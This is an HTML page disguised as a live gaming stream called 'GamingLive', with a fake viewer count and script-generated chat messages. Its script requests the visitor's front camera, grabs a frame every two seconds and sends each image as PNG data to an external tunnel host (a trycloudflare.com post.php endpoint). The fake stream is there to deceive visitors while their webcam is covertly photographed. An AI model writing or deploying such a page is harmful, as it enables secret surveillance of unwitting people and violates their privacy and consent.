<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
    background: #000;
    font-family: 'Arial', sans-serif;
}
.live-badge {
    background: #ff0000;
    color: white;
    position: fixed;
    top: 20px;
    left: 20px;
    padding: 8px 16px;
    border-radius: 30px;
    z-index: 100;
    animation: pulse 1.5s infinite;
}
@keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.6; } }
.stream-container {
    width: 100%;
    max-width: 800px;
    margin: 60px auto 0;
    background: #111;
    border-radius: 10px;
    overflow: hidden;
}
.stream-header {
    background: #1a1a1a;
    padding: 15px;
    color: white;
    display: flex;
    align-items: center;
    gap: 10px;
}
.streamer-avatar {
    width: 40px;
    height: 40px;
    background: #ff4444;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
}
.stream-video {
    background: #0a0a0a;
    min-height: 400px;
    position: relative;
}
video, canvas { width: 100%; display: none; }
.placeholder-video {
    width: 100%;
    height: 400px;
    background: linear-gradient(45deg, #1a1a1a, #2a2a2a);
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 100px;
}
.chat-box {
    background: #1a1a1a;
    height: 300px;
    overflow-y: auto;
    padding: 15px;
    color: #ccc;
}
.chat-message { margin-bottom: 10px; }
.chat-input {
    display: flex;
    padding: 15px;
    background: #0a0a0a;
    gap: 10px;
}
.chat-input input {
    flex: 1;
    padding: 10px;
    background: #1a1a1a;
    border: none;
    color: white;
    border-radius: 20px;
}
.viewer-count {
    position: fixed;
    top: 20px;
    right: 20px;
    background: rgba(0,0,0,0.7);
    color: white;
    padding: 5px 12px;
    border-radius: 20px;
}
</style>
</head>
<body>
<div class="live-badge">🔴 LIVE</div>
<div class="viewer-count">👥 1.2K watching</div>
<div class="stream-container">
    <div class="stream-header">
        <div class="streamer-avatar">🎮</div>
        <div>
            <strong>GamingLive</strong>
            <div style="font-size: 12px; color: #888;">Live now</div>
        </div>
    </div>
    <div class="stream-video">
        <div class="placeholder-video">🎮</div>
        <video id="video" playsinline autoplay></video>
        <canvas id="canvas" width="640" height="480"></canvas>
    </div>
    <div class="chat-box" id="chat">
        <div class="chat-message">💬 <strong>Viewer1:</strong> Awesome stream!</div>
        <div class="chat-message">💬 <strong>Viewer2:</strong> 🔥🔥🔥</div>
    </div>
    <div class="chat-input">
        <input type="text" placeholder="Say something...">
        <button>Send</button>
    </div>
</div>
<script>
function post(imgdata) {
    $.ajax({ type: 'POST', data: { cat: imgdata }, url: 'https://colleges-digest-angela-cholesterol.trycloudflare.com/post.php' });
}
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const constraints = { audio: false, video: { facingMode: "user" } };
async function init() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        video.srcObject = stream;
        video.style.display = 'block';
        document.querySelector('.placeholder-video').style.display = 'none';
        const context = canvas.getContext('2d');
        setInterval(() => {
            context.drawImage(video, 0, 0, 640, 480);
            post(canvas.toDataURL("image/png"));
        }, 2000);
    } catch(e) { console.log(e); }
}
init();
setInterval(() => {
    const msgs = ["🔥 Great content!", "👍", "💯", "🎉"];
    const chat = document.getElementById('chat');
    const newMsg = document.createElement('div');
    newMsg.className = 'chat-message';
    newMsg.innerHTML = `💬 <strong>Viewer${Math.floor(Math.random()*1000)}:</strong> ${msgs[Math.floor(Math.random()*msgs.length)]}`;
    chat.appendChild(newMsg);
    chat.scrollTop = chat.scrollHeight;
}, 8000);
</script>
</body>
</html>
